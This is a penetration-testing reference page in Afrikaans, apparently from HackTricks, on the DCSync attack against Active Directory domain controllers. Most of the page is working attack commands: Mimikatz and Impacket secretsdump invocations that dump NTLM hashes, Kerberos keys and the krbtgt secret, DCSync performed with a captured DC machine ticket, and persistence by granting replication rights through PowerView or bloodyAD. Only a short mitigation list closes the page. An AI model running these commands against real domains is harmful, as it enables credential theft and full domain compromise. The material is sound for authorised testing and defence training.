# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-toestemming impliseer dat die volgende toestemmings oor die domein self bestaan: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Belangrike notas oor DCSync:**

- Die **DCSync attack simuleer die gedrag van 'n Domain Controller en vra ander Domain Controllers om inligting te repliseer** deur die Directory Replication Service Remote Protocol (MS-DRSR) te gebruik. Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
- By verstek het slegs die **Domain Admins, Enterprise Admins, Administrators en Domain Controllers**-groepe die vereiste privileges.
- In praktyk benodig **full DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** op die domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` word gewoonlik saam met hulle gedelegeer, maar op sy eie is dit meer relevant vir die sinkronisering van **confidential / RODC-filtered attributes** (byvoorbeeld legacy LAPS-style secrets) as vir 'n volledige krbtgt-dump.<sup>[[2]](#references)</sup>
- Indien enige account passwords met reversible encryption gestoor word, is 'n opsie in Mimikatz beskikbaar om die password in clear text terug te gee

### Enumerasie

Kontroleer wie hierdie toestemmings het deur `powerview` te gebruik:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
As jy op **nie-standaard principals** met DCSync-regte wil fokus, filter die ingeboude groepe wat replikasie kan uitvoer uit en hersien slegs onverwagte trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Plaaslik
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit op afstand
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktiese afgebakende voorbeelde:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync met 'n vasgevangde DC-masjien-TGT (ccache)

In scenario's met unconstrained-delegation export-mode kan jy 'n Domain Controller-masjien-TGT vasvang (bv. `DC1$@DOMAIN` vir `krbtgt@DOMAIN`). Jy kan dan daardie ccache gebruik om as die DC te authenticate en DCSync sonder 'n wagwoord uit te voer.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operasionele notas:

- **Impacket se Kerberos-pad raak eers SMB** voordat die DRSUAPI-oproep gemaak word. As die omgewing **SPN target name validation** afdwing, kan ’n volledige dump misluk met `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In daardie geval, versoek eers ’n **`cifs/<dc>`**-serviceticket vir die teiken-DC, of gebruik **`-just-dc-user`** vir die rekening wat jy onmiddellik benodig.
- Wanneer jy slegs laer replication-regte het, kan LDAP/DirSync-styl-sinkronisering steeds **confidential** of **RODC-filtered** attribute blootlê (byvoorbeeld die legacy `ms-Mcs-AdmPwd`) sonder volledige krbtgt-replikasie.<sup>[[2]](#references)</sup>

`-just-dc` genereer 3 lêers:

- een met die **NTLM hashes**
- een met die **Kerberos keys**
- een met cleartext-wagwoorde uit die NTDS vir enige rekeninge waarvoor [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer is. Jy kan gebruikers met reversible encryption kry met

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

As jy ’n domain admin is, kan jy hierdie permissions aan enige gebruiker toeken met behulp van PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux-operateurs kan dieselfde met `bloodyAD` doen:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Dan kan jy **kontroleer of die gebruiker korrek** die 3 privileges toegeken is deur hulle in die uitvoer van te soek (jy behoort die name van die privileges binne die "ObjectType"-veld te kan sien):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – 'n Operasie is op 'n objek uitgevoer<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – 'n Directory Service-objek is gewysig
- Security Event ID 4670 (Audit Policy for object must be enabled) – Toestemmings op 'n objek is verander
- AD ACL Scanner - Skep en vergelyk verslae van ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Benutting van Replication Get-Changes en Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
